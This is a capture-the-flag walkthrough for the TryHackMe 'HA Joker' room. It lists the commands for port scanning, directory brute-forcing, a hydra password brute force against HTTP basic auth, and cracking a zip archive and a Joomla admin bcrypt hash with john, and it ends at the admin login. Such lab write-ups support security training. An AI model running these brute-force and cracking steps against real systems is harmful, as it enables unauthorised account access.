# HA Joker CTF

**Room Link:** [https://tryhackme.com/room/jokerctf](https://tryhackme.com/room/jokerctf)





## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (623).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (624).png" alt=""><figcaption></figcaption></figure>

## TCP/80 - HTTP

**Kali**

```
gobuster dir -u $VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (626).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (625).png" alt=""><figcaption></figcaption></figure>



## TCP/8080 - HTTP

**Kali**

```
hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 -f $VICTIM http-get /
```

<figure><img src="../../.gitbook/assets/image (627).png" alt=""><figcaption></figcaption></figure>



wasn't finding it but should have found a backup.zip

**Kali**

```
nikto -id joker:hannah -h $VICTIM:8080
```

<figure><img src="../../.gitbook/assets/image (629).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
zip2john backup.zip > secure_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt 
unzip backup.zip
Password: hannah
```

<figure><img src="../../.gitbook/assets/image (630).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cd db
cat joomladb.sql | grep admin
```

**Hash**

```
$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG
```

**Kali**

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (631).png" alt=""><figcaption></figcaption></figure>













**Browser**

```
Username: admin
Password: abcd1234
```

<figure><img src="../../.gitbook/assets/image (628).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (632).png" alt=""><figcaption></figcaption></figure>





















